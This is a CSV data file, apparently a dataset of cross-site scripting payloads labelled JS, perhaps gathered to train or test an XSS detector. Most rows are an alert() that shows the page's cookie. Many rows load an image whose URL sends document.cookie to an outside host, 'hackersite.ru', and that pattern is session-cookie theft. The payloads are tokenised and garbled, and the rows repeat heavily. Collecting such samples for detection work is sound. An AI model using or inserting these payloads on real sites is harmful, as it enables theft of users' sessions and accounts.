,language,source
1690,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1691,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1692,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1693,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1694,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1695,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1696,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1697,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1698,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1699,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1700,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1701,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1702,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1703,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1704,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1705,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1706,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1707,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1708,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1709,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1710,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1711,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1712,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1713,JS,? = > < script > alert ( « cookie : « + document . cookie ) < / script >
1714,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1715,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1716,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1717,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1718,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1719,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1720,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1721,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1722,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1723,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1724,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1725,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1726,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1727,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1728,JS,< script > var img = new image ( ) ; img . src = ? + encodeuri ( document . cookie ) ; < / script >
1729,JS,< script > var img = new image ( ) ; img . src = ? + encodeuri ( document . cookie ) ; < / script >
1730,JS,"< script > var img = new image ( ) ; img . src = "" http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1731,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1732,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1733,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1734,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1735,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1736,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1737,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1738,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1739,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1740,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1741,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1742,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1743,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1744,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1745,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1746,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1747,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1748,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1749,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1750,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1751,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1752,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1753,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1754,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1755,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1756,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1757,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1758,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1759,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1760,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1761,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1762,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1763,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1764,JS,? = > < script > alert ( « cookie : « + document . cookie ) < / script >
1765,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1766,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1767,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1768,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1769,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1770,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1771,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1772,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1773,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1774,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1775,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1776,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1777,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1778,JS,"< script > var img = new image ( ) ; img . src = "" ? "" + encodeuri ( document . cookie ) ; < / script >"
1779,JS,< script > var img = new image ( ) ; img . src = ? + encodeuri ( document . cookie ) ; < / script >
1780,JS,< script > var img = new image ( ) ; img . src = ? + encodeuri ( document . cookie ) ; < / script >
1781,JS,"< script > var img = new image ( ) ; img . src = "" http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1782,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1783,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1784,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1785,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1786,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1787,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1788,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1789,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1790,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1791,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1792,JS,"< script > var img = new image ( ) ; img . src = http : / / hackersite . ru / xss . jpg ? "" + encodeuri ( document . cookie ) ; < / script > """
1793,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1794,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1795,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1796,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1797,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1798,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1799,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1800,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1801,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1802,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1803,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1804,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1805,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1806,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1807,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1808,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1809,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1810,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1811,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1812,JS,"< script > var img = new image ( ) ; img . src = ? "" + encodeuri ( document . cookie ) ; < / script > """
1813,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1814,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1815,JS,? = > < script > alert ( « cookie : « + document . cookie ) < / script >
1816,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1817,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1818,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1819,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
1820,JS,< script > alert ( « cookie : « + document . cookie ) < / script >
